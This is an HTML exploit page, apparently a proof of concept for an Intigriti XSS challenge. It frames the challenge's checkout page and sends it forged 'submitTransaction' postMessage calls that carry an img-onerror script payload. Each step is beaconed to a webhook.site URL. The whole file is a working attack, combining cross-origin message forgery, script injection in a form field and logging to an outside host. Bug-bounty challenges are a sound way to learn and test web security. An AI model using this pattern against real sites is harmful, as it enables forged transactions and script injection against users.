<!DOCTYPE html>
<html><head><title>Auth Check</title></head>
<body>
<h2>Checking auth...</h2>
<script>
const WEBHOOK = 'https://webhook.site/c1d482da-2ed2-46ef-ae1f-93a94efd96f6';

fetch(WEBHOOK + '?s=1_START').catch(()=>{});

const blank = window.open('about:blank', '_blank');

if (blank) {
    blank.document.write(`
        <!DOCTYPE html>
        <body>
        <h3>Auth check</h3>
        <div id=log></div>
        <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:100%;height:400px"></iframe>
        <script>
            const WEBHOOK = '${WEBHOOK}';
            
            function log(msg) {
                document.getElementById('log').innerHTML += '<br>' + msg;
                fetch(WEBHOOK + '?s=' + msg).catch(()=>{});
            }
            
            log('2_LOADED');
            
            document.getElementById('x').onload = function() {
                const iframe = document.getElementById('x');
                
                // Check what page actually loaded
                try {
                    const url = iframe.contentWindow.location.href;
                    log('3_URL_' + url.replace(/[^a-zA-Z0-9/:.]/g, '_'));
                } catch(e) {
                    log('3_CORS_BLOCKED');
                }
                
                // Try to send a simple message and see if we get a response
                setTimeout(function() {
                    // Send a message to see if checkout.html is listening
                    iframe.contentWindow.postMessage({type: 'ping'}, '*');
                    log('4_PING_SENT');
                    
                    // Send the actual transaction
                    setTimeout(function() {
                        iframe.contentWindow.postMessage({
                            type: 'submitTransaction',
                            transaction: {
                                toAddress: '16472226db03703a192aa383237035a69f',
                                currency: '1337COIN',
                                amount: 1,
                                nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
                            }
                        }, '*');
                        log('5_TRANSACTION_SENT');
                    }, 1000);
                }, 2000);
            };
        <\/script>
        </body>
    `);
    blank.document.close();
}
</script>
</body>
</html>
